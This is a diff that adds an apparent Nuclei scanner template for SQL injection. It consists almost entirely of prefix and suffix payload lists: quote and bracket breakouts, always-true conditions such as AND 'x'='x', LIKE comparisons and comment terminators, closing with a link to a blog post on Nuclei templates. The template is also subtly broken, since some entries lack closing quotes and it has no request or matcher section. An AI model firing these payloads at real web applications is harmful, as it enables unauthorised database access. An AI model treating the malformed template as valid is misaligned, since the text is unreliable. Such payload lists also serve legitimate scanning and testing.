@@ -1,0 +1,83 @@
+## SQL Injection Nuclei Template
+
+variables:
+  randomchar1: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+  randomchar2: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+  randomstr1: {{rand_text_alpha(4, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+  randomstr2: {{rand_text_alpha(4, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+  randomnum1: {{rand_int(1, 10)}}
+  randomnum2: {{rand_int(1, 10)}}
+
+payloads:
+  prefix:
+    - ""
+    - " "
+    - "' "
+    - "\" "
+    - ") "
+    - ")) "
+    - "))) "
+    - "') "
+    - "')) "
+    - "'))) "
+    - "\") "
+    - "\")) "
+    - "\"))) "
+    - "%'"
+    - " WHERE {{randomnum1}}={{randomnum1}} "
+    - "' WHERE {{randomnum1}}={{randomnum1}} "
+    - "\" WHERE {{randomnum1}}={{randomnum1}} "
+    - "\") WHERE {{randomnum1}}={{randomnum1}} "
+    - "'||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+    - "'||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+    - "'+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+    - "||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+    - "||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+    - "+(SELECT {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - "+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+    - "')) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - "\")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - ")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - "') AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - "\") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - ") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+    - "` WHERE {{randomnum1}}={{randomnum1}} "
+    - "`) WHERE {{randomnum1}}={{randomnum1}} "
+    - "]-(SELECT 0 WHERE {{randomnum1}}={{randomnum1}} "
+    - "{{randomstr1}}, "
+  suffix:
+    - ""
+    - " "
+    - "#"
+    - "# {{randomstr1}}"
+    - "--"
+    - "-- {{randomstr1}}"
+    - "-- -"
+    - ")+"
+    - ")||'"
+    - ")+'"
+    - "OR '{{randomstr1}}'='{{randomstr2}}
+    - "AND ({{randomnum1}}={{randomnum1}}"
+    - "AND (({{randomnum1}}={{randomnum1}}"
+    - "AND ((({{randomnum1}}={{randomnum1}}"
+
+    - "AND ('{{randomstr1}}'='{{randomstr1}}"
+    - "AND (('{{randomstr1}}'='{{randomstr1}}"
+    - "AND ((('{{randomstr1}}'='{{randomstr1}}"
+    - "AND '{{randomstr1}}'='{{randomstr1}}"
+    - "AND ('{{randomstr1}}' LIKE '{{randomstr1}}"
+    - "AND (('{{randomstr1}}' LIKE '{{randomstr1}}"
+    - "AND ((('{{randomstr1}}' LIKE '{{randomstr1}}"
+    - "AND '{{randomstr1}}%'='{{randomstr1}}"
+    - "AND '{{randomstr1}}' LIKE '{{randomstr1}}"
+    - "AND (\"{{randomstr1}}\"=\"{{randomstr1}}"
+    - "AND ((\"{{randomstr1}}\"=\"{{randomstr1}}"
+    - "AND (((\"{{randomstr1}}\"=\"{{randomstr1}}"
+    - "AND \"{{randomstr1}}\"=\"{{randomstr1}}"
+    - "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+    - "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+    - "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+    - "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
+    - "{{randomstr2}}"
+
+https://www.kayssel.com/post/nuclei-templates/ (and for POST requests)
